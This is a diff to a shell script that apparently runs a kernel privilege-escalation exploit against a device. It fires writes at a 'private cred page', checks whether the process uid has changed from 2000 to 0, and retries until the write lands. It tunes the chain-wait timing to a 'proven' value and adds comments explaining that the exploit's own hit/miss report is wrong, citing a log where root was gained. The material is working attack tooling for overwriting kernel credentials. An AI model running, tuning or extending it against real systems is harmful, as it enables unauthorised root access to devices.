@@ -47,7 +47,11 @@ TASKF=$DEV/bootA_task_$TAG.txt
 RES=$DEV/bootA_res_$TAG.txt
 OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
 HOLD=${HOLD:-20}
-CHAINWAIT=${CHAINWAIT:-4000}
+# CHAINWAIT: the proven value is 6000 ms (tools/t5loop.sh CW=6000).  The code
+# default is 20000 ms.  4000 was tried for speed and is BELOW anything that has
+# ever landed — the chain simply has not finished, which shows up as
+# probe_state=R and an unchanged readback.
+CHAINWAIT=${CHAINWAIT:-6000}
 NODRAIN=${NODRAIN:-1}
 ROUNDS=${ROUNDS:-1}
 CONTROL=${CONTROL:-0}
@@ -203,15 +207,28 @@ shot() {
     say "  [$tag] shot wall-clock: $((t1 - t0))s"
     grep -E 'write value|write_value|write_target|probe_state|probe_done|LOCAL repair|PIN child|HOLD|REFUSED' \
         "$OUT/w7_$tag.txt" | sed 's/^/    /'
-    printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1
+    # ★ probe_state semantics for W7 (docs/28, and tools/t5loop.sh line 11):
+    #     D = the write LANDED;  R = it did not;  S = blocked/[7] passed.
+    #   The exploit's own printout only calls S a HIT, so for W7 it reports
+    #   "miss" on the very runs that landed (see out/t5_w7_778.txt:
+    #   `probe_state = D` + `Uid: 0 0 4294967176 0` + "*** 0x778 LANDED ***").
+    #   Never trust its HIT/miss line here.
+    SHOT_PS=$(sed -n 's/^probe_state *= *\([A-Z?]\).*/\1/p' "$OUT/w7_$tag.txt" | tail -1)
+    SHOT_CRED=$(printf '%s\n' "$out" | sed -n 's/.*write value = private cred page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
+    say "  [$tag] probe_state=$SHOT_PS  (D=landed, R=miss, S=blocked)"
+    return 0
 }
 
 # up to $4 shots at one offset; no kill; stop as soon as the readback moves
 shot_until() {   # $1=off $2=extra $3=tag $4=rounds -> 0 if the readback moved
     local off=$1 extra=$2 tag=$3 rounds=${4:-1} r u
     for r in $(seq 1 "$rounds"); do
-        shot "$off" "$extra" "${tag}r$r" >/dev/null
+        shot "$off" "$extra" "${tag}r$r"
         if ! alive; then say "  !! DEVICE GONE after $tag round $r"; exit 5; fi
+        if [ "${SHOT_PS:-}" = "D" ]; then
+            say "  [$tag] probe_state=D on round $r — the write landed"
+            return 0
+        fi
         u=$(poll_uid "$CPID" 8)
         case "$u" in
             ""|*"2000 2000 2000 2000"*)
